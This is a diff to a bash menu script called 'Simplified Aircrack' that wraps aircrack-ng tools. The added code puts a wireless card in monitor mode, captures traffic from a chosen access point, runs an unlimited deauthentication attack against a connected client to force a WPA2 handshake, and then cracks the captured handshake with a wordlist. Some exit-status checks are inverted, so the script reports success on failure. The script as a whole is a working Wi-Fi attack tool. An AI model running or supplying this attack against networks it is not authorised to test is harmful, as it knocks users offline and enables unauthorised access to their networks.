@@ -21,6 +21,7 @@ echo -e "$GREEN ~Simplified Aircrack~ $COEND"
 printf "Which operation would you like to run...?\n"
 echo -e "$GREEN [1] Start $COEND"
 echo -e "$RED [2] Exit $COEND"
+echo -e "$YELLOW [3] README $COEND"
 echo "-------------------------------------------------------"
 date
 uptime
@@ -39,6 +40,17 @@ case $start_menu in
 	clear
 	exit
 
+	;;
+
+3)
+	echo -e "$YELLOW ~READ ME~ $COEND"
+	echo "Before cracking add a folder at the destination of -/root/Crack-"
+	echo "Make sure you have a list of words to use"
+	echo "Good source for learning cracking https://www.youtube.com/watch?v=uEXugINjFuo&index=1&list=WL"
+	read WAIT_FOR_USER
+	clear
+	menu
+	
 	;;
 
 *)
@@ -62,22 +74,27 @@ menu2()
 clear
 echo -e "$YELLOW ############################################### $COEND"
 printf "[1] View all surrounding wireless networks\n"
-printf "[2] View all users connected to a specific network\n"
-printf "[3] Sniffing IVs\n"
-echo -e "$RED [4] Exit $COEND"
+printf "[2] Listen on one CH\n"
+printf "[3] Listen on one CH | Write data down\n"
+printf "[4] Password Cracking\n"
+echo -e "$RED [5] Exit $COEND"
 echo -e "$GREEN ----------------------------------------------------------- $COEND"
 read begin_menu2
+
 case $begin_menu2 in
 1)
 	sleep 1
+	airmon-ng start wlan0
+	airodump-ng mon0
 	if [ $? -eq 0 ]; then
 		echo -e "$GREEN [+] Success... $COEND"
 	else
 		echo -e "$RED [!] Unsuccessful... $COEND"
+		read WAIT_FOR_USER
+		clear
+		menu2
 	fi
-	sleep 1
-	airmon-ng start wlan0
-	airodump-ng mon0
+	read WAIT_FOR_USER
 	clear
 	menu2
 
@@ -85,18 +102,23 @@ case $begin_menu2 in
 
 2)
 	sleep 1
+	airmon-ng start wlan0
+	echo -e "$RED [!] Input CH $COEND"
+	read CH
+	echo -e "$RED [!] Input BSSID $COEND"
+	read BSSID
+	echo -e "$RED [!] Input INTERFACE $COEND"
+	read INTERFACE
+	airodump-ng -c $CH --bssid $BSSID -w dump $INTERFACE
 	if [ $? -eq 0 ]; then
 		echo -e "$GREEN [+] Success... $COEND"
 	else
 		echo -e "$RED [!] Unsuccessful... $COEND"
+		read WAIT_FOR_USER
+		clear
+		menu2
 	fi
-	sleep 1
-	airmon-ng start wlan0
-	echo -e "$RED [!] Input BSSID $COEND"
-	read BSSID
-	echo -e "$RED [!] Input WLAN0... $COEND"
-	read WLAN
-	airodump-ng -c 11 --bssid $BSSID -w dump $WLAN
+	read WAIT_FOR_USER
 	clear
 	menu2
 
@@ -104,22 +126,71 @@ case $begin_menu2 in
 
 3)
 	sleep 1
-	if [ $? -eq 0 ]; then
-		echo -e "$GREEN [+] You will listen on one CH... $COEND"
-	else
-		echo -e "$RED [!] Unsuccessful... $COEND"
-	fi
-	sleep 1
-	echo -e "$GREEN Input BSSID... $COEND"
+	echo -e "$RED [!] Input CH $COEND"
+	read CH
+	echo -e "$RED [!] Input BSSID $COEND"
 	read BSSID
-	airodump-ng -c 11 --bssid $BSSID -w dump mon0
-	echo -e "$GREEN Data written | Sniff complete $COEND"
+	echo -e "$RED [!] INTERFACE $COEND"
+	read INTERFACE
+	airodump-ng -c $CH --bssid $BSSID -w dump $INTERFACE
+	if [ $? -ne 0 ]; then
+	    echo -e "$GREEN [+] Data written | Sniff complete $COEND"
+	else
+	    echo -e "$RED [!] Unsuccessful... $COEND"
+		sleep 1
+		clear
+		menu2
+	fi
+	read WAIT_FOR_USER
 	clear
 	menu2
 
 	;;
 
 4)
+	sleep 1
+	airmon-ng check kill
+	ifconfig wlan0 down
+	airmon-ng start wlan0
+	read WAIT_FOR_USER
+	echo "-----------------------------------------------------------"
+	echo -e "$YELLOW Searching for surrounding networks $COEND"
+	sleep 2
+	airodump-ng mon0
+	echo "-----------------------------------------------------------"
+	echo -e "$RED [!] Input CH $COEND"
+	read CH
+	echo -e "$RED [!] Input BSSID $COEND"
+	read BSSID
+	airodump-ng mon0 -c $CH --bssid $BSSID -w /root/Crack/wpa2psk
+	echo "-----------------------------------------------------------"
+	echo -e "$RED [!] Input BSSID $COEND"
+	read BSSID
+	echo -e "$RED [!] Input STATION $COEND"
+	read STATION
+	aireplay-ng -0 0 -a $BSSID -c $STATION mon0
+	echo "-----------------------------------------------------------"
+	echo -e "$YELLOW Example of CAPDEST and WORDDEST $COEND"
+	echo -e "$YELLOW /root/Crack/wpa2psk-01.cap | root/Desktop/Wordlist $COEND"
+	echo -e "$RED [!] Input CAPDEST $COEND"
+	read CAPDEST
+	echo -e "$RED [!] Input WORDDEST $COEND"
+	read WORDDEST
+	echo -e "$RED This may take a while to process -press enter to execute cracking- $COEND"
+	read WAIT_FOR_USER
+	aircrack-ng $CAPDEST -w $WORDDEST
+	if [ $? -ne 0 ]; then
+	    echo -e "$GREEN [+] Cracking success... $COEND"
+	else
+	    echo -e "$RED [!] Unsuccessful... $COEND"
+	fi
+	read WAIT_FOR_USER
+	clear
+	menu2
+	
+	;;
+	
+5)
 	echo -e "$RED [!] Shutting down... $COEND"
 	clear
 	exit
